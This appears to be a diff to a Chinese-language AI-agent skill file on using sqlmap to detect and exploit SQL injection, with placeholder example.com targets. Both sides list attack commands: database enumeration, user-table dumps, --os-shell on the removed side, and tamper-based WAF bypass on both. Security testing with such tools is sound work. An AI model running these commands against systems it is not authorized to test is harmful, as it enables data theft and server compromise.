@@ -9,78 +9,78 @@ description: 当需要检测和利用 SQL 注入漏洞时使用
 sqlmap -u "https://example.com/api?id=1"
 ```
 
-## 常用参数
+## 常用参数（高频）
 
 ```bash
-# 检测注入点
+# 基础检测
 sqlmap -u "https://example.com/page?id=1"
 
-//指定参数检测（只测 id 参数）
+# 指定参数检测（只测 id）
 sqlmap -u "https://example.com/page?id=1" -p id
 
-//POST 请求检测
+# POST 请求检测（表单）
 sqlmap -u "https://example.com/login" --data="user=admin&pass=123"
 
-//从文件读取请求（Burp 抓包导出）
+# 从原始 HTTP 请求文件读取（-r）
 sqlmap -r request.txt
 
-//带 Cookie
+# 带 Cookie
 sqlmap -u "https://example.com/page?id=1" --cookie="session=abc123"
 
-//带 Header
-sqlmap -u "https://example.com/api/data" -H="Authorization: Bearer xxx"
-
-//获取数据库信息
-sqlmap -u "https://example.com/page?id=1" --dbs
-
-//获取表
-sqlmap -u "https://example.com/page?id=1" -D dbname --tables
-
-//获取列
-sqlmap -u "https://example.com/page?id=1" -D dbname -T users --columns
-
-//导出数据
-sqlmap -u "https://example.com/page?id=1" -D dbname -T users --dump
-
-//执行 SQL 语句
-sqlmap -u "https://example.com/page?id=1" --sql-query="SELECT version()"
-
-//获取 shell（os-shell，需要 DBA 权限）
-sqlmap -u "https://example.com/page?id=1" --os-shell
-
-//指定注入技术（默认全部尝试）
-# B=Boolean, E=Error, U=Union, S=Stacked, T=Time, Q=Query
-sqlmap -u "https://example.com/page?id=1" --technique=BEUSTQ
-
-//风险等级和级别
-sqlmap -u "https://example.com/page?id=1" --risk=3 --level=5
+# 常用扫描控制（避免超时）
+sqlmap -u "https://example.com/page?id=1" --level=1 --risk=1 --technique=BE --timeout=10 --retries=1 --batch
 ```
 
-## 典型流程
+## JSON API 模板（推荐优先）
 
 ```bash
-# 1. 检测注入点
-sqlmap -u "https://example.com/page?id=1" --batch
+# 先用 curl 验证认证链路，再跑 sqlmap
+curl -s -X POST "https://example.com/api/search" \
+  -H "Content-Type: application/json" \
+  -H "Authorization: Bearer <TOKEN>" \
+  -H "organization-code: <ORG_CODE>" \
+  -d '{"keyword":"test","page":1}'
 
-# 2. 发现注入后，获取数据库
-sqlmap -u "https://example.com/page?id=1" --dbs --batch
-
-# 3. 获取目标表
-sqlmap -u "https://example.com/page?id=1" -D mydb --tables --batch
-
-# 4. 导出数据
-sqlmap -u "https://example.com/page?id=1" -D mydb -T users --dump --batch
-
-# 5. 尝试 os-shell
-sqlmap -u "https://example.com/page?id=1" --os-shell --batch
+sqlmap -u "https://example.com/api/search" \
+  --method POST \
+  --data='{"keyword":"test","page":1}' \
+  -H "Content-Type: application/json" \
+  -H "Authorization: Bearer <TOKEN>" \
+  -H "organization-code: <ORG_CODE>" \
+  -p keyword \
+  --level=1 --risk=1 --technique=BE \
+  --timeout=10 --retries=1 --batch --flush-session
 ```
 
-## 注意事项
+## -r 请求文件规范（关键）
+
+`sqlmap -r` 读取的是“原始 HTTP 请求”，不是 curl 命令文本。`request.txt` 必须类似：
+
+```http
+POST /api/search HTTP/1.1
+Host: example.com
+Content-Type: application/json
+Authorization: Bearer <TOKEN>
+organization-code: <ORG_CODE>
+
+{"keyword":"test","page":1}
+```
+
+要点：
+- 第一行必须是 `METHOD PATH HTTP/1.1`
+- 必须包含 `Host` 头
+- 头和 body 之间必须有空行
+- 不要写 shell 提示符、curl 命令、注释字符
+
+## 推荐流程（避免“工具失败”误判）
 
 - `--batch` 使用默认选项，不交互确认，AI 调用时必须加
-- `--risk=3` 会测试更多 payload，但可能对目标造成影响（UPDATE/DELETE 注入）
-- `--level=5` 测试 HTTP 头（Cookie/User-Agent/Referer），默认只测 1-2 级
-- 检测到注入后先 `--dbs` 看有哪些库，再逐步深入
-- `--tamper` 可以绕过 WAF，如 `--tamper=space2comment,between`
-- 大量数据导出用 `--start=0 --stop=100` 分页
+- 先做认证验证：先 `curl` 跑通，再 `sqlmap`
+- 先小后大：先 `--level=1 --risk=1 --technique=BE`，再逐步加深
+- 参数收敛：优先用 `-p` 指定单参数，避免全参数扫描超时
+- 控制时长：`--timeout=10 --retries=1`，长任务拆成多次短任务
+- JSON API 优先 `-u + --method + --data`，`-r` 仅在你能提供标准 raw 请求时使用
+- 若切换策略或参数，使用 `--flush-session` 清理历史缓存，避免旧结果干扰
+- 仅在确认注入后再执行 `--dbs / --tables / --columns / --dump` 等深度动作
+- `--tamper` 仅在怀疑 WAF 拦截时启用，如 `--tamper=space2comment,between`
 - 结果保存在 `~/.local/share/sqlmap/output/` 下
